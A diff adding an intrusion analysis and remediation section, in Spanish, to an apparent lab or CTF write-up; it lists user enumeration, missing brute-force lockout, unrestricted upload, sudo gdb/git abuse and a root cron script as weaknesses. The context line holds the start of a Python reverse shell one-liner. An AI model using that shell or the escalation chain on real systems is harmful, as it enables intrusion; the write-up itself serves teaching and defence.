@@ -127,3 +127,25 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 
 Mediante la reverse shell accedemos facilmente como root y ya tenemos la máquina
+
+# Analisís de la intrusión
+### Sensible data leak
+El sitio web nos permite saber si un usuario existe o no, esto reduce bastante el tiempo necesario para un ataque existoso de fuerza bruta
+### Bruteforcing allowed
+El sitio web no bloquea la conexión tras un gran numero de intentos de login
+### Unrestricted File Upload
+No existe ningun tipo de comprobación respecto a los archivos que pueden ser subidos mediante el servicio web
+### Privileged command execution
+Poder ejcutar ciertos comandos como otros usuarios nos permitiio movernos lateralmente a traves de varios usuarios 
+### Writable scriipt executed as root
+El script clenaup.py es editable por el usuario d4rckh y es ejecutado como root mediante el crontab eso nos lleva a poder escalar privilegios
+
+# Soluciones
+### Sensible data leak
+Eliminar el mensaje de usuario incorrecto y cambiarlo por el mismo que se usa para la contraseña incorrecta
+### Unrestricted File Upload
+Añadir una serie de filtros para los principales tipos de archivo que el servidor puede ejecutar (phpX , phtm , aspx ...) evitaria este problema
+### Privileged command execution
+El uso de gdb como otro usuario es cuanto menos extraño y creo que deberia ser deshabilitado directamente, en cuanto a git, si puede ser necesario para acceder a repositorios del otro usuario, añadir la clave del usuario a las autorizadas del repo seria una mejor idea
+### Writable scriipt executed as root
+Si es necesario que se ejecute este script con permisos de root se deberían de tomar medidas para que no pudiera ser editado ni sustituido por una usuario comun, trasladar este script a la carpeta de root seria mas apropiado
